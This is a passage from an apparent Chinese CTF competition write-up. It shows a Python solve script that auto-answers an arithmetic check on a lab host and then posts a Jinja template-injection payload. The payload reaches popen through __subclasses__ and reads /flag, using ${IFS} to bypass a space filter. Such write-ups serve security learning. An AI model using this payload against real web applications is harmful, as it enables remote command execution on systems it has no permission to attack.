class="string">&#x27;index.html&#x27;</span>, username=username, hint=<span class="string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<p>ssti打即可</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">是ssti 过滤了空格，$&#123;IFS&#125;绕过即可拿到flag</span><br><span class="line">notadmin-pcb2024</span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_expression</span>(<span class="params">expression</span>):</span><br><span class="line">tokens = re.findall(<span class="string">r&#x27;\d+|[+\-*/]&#x27;</span>, expression)</span><br><span class="line">result = <span class="built_in">eval</span>(<span class="string">&#x27;&#x27;</span>.join(tokens))</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">res = requests.get(url + <span class="string">&quot;/calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;抓取到的算式:&quot;</span>, res.text)</span><br><span class="line">result = calculate_expression(res.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;计算结果:&quot;</span>, result)</span><br><span class="line">submit_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=%E6%8F%90%E4%BA%A4&quot;</span></span><br><span class="line">response_get = requests.get(submit_url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;GET 请求返回的响应页面：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response_get.text)</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()</span></span><br><span class="line"><span class="string">[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat$&#123;IFS&#125;/flag&#x27;).read()&#125;&#125;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">response_post = requests.post(submit_url, data=data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;提交后的响应页面（POST）：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response_post.text)</span><br></pre></td></tr></table></figure></div>
 ]]></content>
       <tags>
         <tag>竞赛复盘</tag>
